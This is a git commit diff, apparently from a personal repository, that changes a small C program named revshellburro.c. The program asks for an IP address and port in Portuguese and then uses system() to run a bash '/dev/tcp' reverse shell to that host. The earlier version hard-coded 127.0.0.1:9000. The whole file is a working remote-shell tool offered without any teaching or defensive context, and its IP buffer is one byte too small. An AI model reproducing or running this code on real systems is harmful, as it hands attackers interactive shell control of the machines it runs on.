84a35d729f0e9f7a2ee463072208e6aa4fca34d9
Francisco Begot <124198697+FranciscoBegot@users.noreply.github.com>
2025-03-28 09:17:44 -0300

    Add files via upload

--- revshellburro.c
+++ revshellburro.c
@@ -1,9 +1,22 @@
 #include <stdio.h>
 #include <stdlib.h>
 int main(){
-  int  a;
+  char ip[15];
+  int porta;
 
-  system("echo ber");
-  system("/bin/bash -c 'sh -i >&/dev/tcp/127.0.0.1/9000 0>&1'");
+
+  puts("Digite seu ip,exemplo: 127.0.0.1");    scanf("%15s",&ip);
+  puts("Digite sua porta,exeplo: 9000");       scanf("%d",&porta);
+
+
+  char comando[100];
+   
+  snprintf(comando, sizeof(comando), "/bin/bash -c 'sh -i >& /dev/tcp/%s/%d 0>&1'", ip, porta);
+
+    
+  system(comando);
+ 
+
+
   return 0;
 }
